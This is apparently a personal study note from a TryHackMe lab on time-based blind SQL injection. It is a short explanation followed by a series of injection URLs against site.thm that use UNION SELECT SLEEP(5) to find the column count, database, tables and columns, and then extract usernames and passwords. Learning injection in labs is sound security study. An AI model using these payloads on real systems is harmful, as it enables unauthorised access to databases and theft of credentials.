@@ -1,0 +1,22 @@
+it has the same method as SQLI BLIND BOOLEAN BASED, but theres no visual indicator of queries is being true or false.
+insted, we can use SLEEP(x) alongside UNION that will only ever get executed upon true results or successful UNION SELECT.
+
+http://site.thm/analytics?referrer=tryhackme.com
+
+
+http://site.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2,...n;-- <--check total columns
+
+
+http://site.thm/analytics?referrer=admin123' union select sleep(5),2,...n where database() like 'db_name%';-- <--check db name with cycle through
+
+
+http://site.thm/analytics?referrer=admin123' union select sleep(5),2,...n from information_schema.tables WHERE table_schema='db_name' and table_name like 'table_name';-- <-- confirm the tbl_name
+
+
+http://site.thm/analytics?referrer=admin123' union select sleep(5),2,...n from information_schema.columns where table_schema='db_name' and table_name='table_name' and column_name like 'a%';-- <-- check column name
+
+
+http://site.thm/analytics?referrer=admin123' union select sleep(5),2,...n from table_name where username like 'a%';--
+
+
+http://site.thm/analytics?referrer=admin123' union select sleep(5),2,...n from table_name where username='username' and password like 'a%';--
